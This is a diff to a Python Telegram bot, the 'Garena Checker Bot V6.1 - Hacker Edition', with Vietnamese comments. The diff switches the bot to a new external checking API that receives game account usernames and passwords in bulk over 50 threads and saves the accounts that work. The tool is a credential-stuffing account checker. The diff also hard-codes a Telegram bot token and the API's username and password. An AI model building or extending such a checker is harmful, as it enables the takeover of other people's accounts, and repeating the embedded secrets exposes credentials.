@@ -1,5 +1,6 @@
 # ========================================================================
 #    GARENA CHECKER BOT V6.1 - HACKER EDITION HOAN CHINH
+#    CẬP NHẬT API: purchase.nhatminh301.com
 # ========================================================================
 #    - HIEU UNG 3D + LASER + MATRIX
 #    - AM THANH TU DONG PHAT
@@ -979,7 +980,7 @@ def start_render_server():
 
 threading_module.Thread(target=start_render_server, daemon=True).start()
 
-# ========== CAU HINH ==========
+# ========== CAU HINH - CẬP NHẬT API MỚI ==========
 TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
 ADMIN_CHAT_ID = "5736655322"
 ADMIN_USERNAME = "baohuyno1"
@@ -988,9 +989,10 @@ REQUIRED_CHANNEL = "@hakiiosvip"
 REQUIRED_CHANNEL_ID = "@hakiiosvip"
 REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"
 
-API_BASE = "https://lol.nhatminh301.com"
-API_USERNAME = "thaituduc"
-API_PASSWORD = "thaituduc"
+# API MỚI - purchase.nhatminh301.com
+API_BASE = "https://purchase.nhatminh301.com"
+API_USERNAME = "api_7567975053"
+API_PASSWORD = "iNH0Tz1daeia"
 
 DEFAULT_THREADS = 50
 DEFAULT_TIMEOUT = 60
@@ -1011,6 +1013,7 @@ OUTPUT_LOC = "loc_accounts.txt"
 
 MAX_MESSAGE_LENGTH = 4000
 
+# ROUTE API MỚI - purchase.nhatminh301.com/api/{service}
 SERVICE_ROUTES = {
     "lienquan": {
         "route": "/api/lienquan",
@@ -1094,7 +1097,7 @@ def fix_encoding(text):
     
     replacements = {
         'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
-        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
+        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
         'Ã¢': 'â', 'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì',
         'á»‹': 'ị', 'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò',
         'Ãº': 'ú', 'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ',
@@ -1102,9 +1105,9 @@ def fix_encoding(text):
         'Nghiá»‡p': 'Nghiệp', 'Hoáº£': 'Hoả', 'YÃªu': 'Yêu', 'Háº­u': 'Hậu',
         'Tháº¿': 'Thế', 'Tá»­': 'Tử', 'Nguyá»‡t': 'Nguyệt', 'Tá»™c': 'Tộc',
         'SiÃªu': 'Siêu', 'viá»‡t': 'việt', 'Ngá»™': 'Ngộ', 'KhÃ´ng': 'Không',
-        'Äao': 'Đao', 'phá»§': 'phủ', 'táº­n': 'tận', 'tháº¿': 'thế',
+        'Äao': 'Đao', 'phá»§': 'phủ', 'táº­n': 'tận', 'tháº¿': 'thế',
         'Giai': 'Giai', 'Ä‘iá»‡u': 'điệu', 'GiÃ¡ng': 'Giáng', 'Sinh': 'Sinh',
-        'Äá»“ng': 'Đồng', 'phá»¥c': 'phục', 'Cáº¥p': 'Cấp', 'Tá»‘i': 'Tối', 
+        'Äá»“ng': 'Đồng', 'phá»¥c': 'phục', 'Cáº¥p': 'Cấp', 'Tá»‘i': 'Tối', 
         'ThÆ°á»£ng': 'Thượng', 'hÃ nh': 'hành', 'K.CÆ°Æ¡ng': 'K.Cương',
         'Tel\'Annas': "Tel'Annas", 'VÅ©': 'Vũ', 'khÃºc': 'khúc', 'yÃªu': 'yêu',
         'Ã¡': 'á', 'Ã¢': 'â', 'Äƒ': 'ă', 'áº¯': 'ắ', 'áº±': 'ằ',
@@ -1412,6 +1415,7 @@ def format_value(value):
         return "YES" if value.lower() == "true" else "NO"
     return value
 
+# ========== CHECK API - CẬP NHẬT ENDPOINT MỚI ==========
 def check_account_api(username, password, service, use_delay=True):
     if use_delay:
         rate_limit(DEFAULT_DELAY)
@@ -1426,6 +1430,8 @@ def check_account_api(username, password, service, use_delay=True):
     param_names = service_info.get("params", ["tk", "mk"])
     extra_params = service_info.get("extra_params", {})
     
+    # CẬP NHẬT: Sử dụng API_BASE mới = purchase.nhatminh301.com
+    # URL: https://purchase.nhatminh301.com/api/lienquan?username=api_7567975053&password=iNH0Tz1daeia&tk=TK&mk=MK
     url = f"{API_BASE}{route}"
     
     params = {
@@ -2258,6 +2264,7 @@ def main():
     print("    GARENA CHECKER BOT V6.1 - HACKER EDITION")
     print("    ADMIN: @baohuyno1")
     print("    TIKTOK: @baohuy1109")
+    print("    API: purchase.nhatminh301.com")
     print("    ===== HIEU UNG 3D + HACKER DEP ===== ")
     print("    ===== AM THANH TU DONG PHAT ===== ")
     print("    ===== KHONG LUU ACCOUNT ===== ")
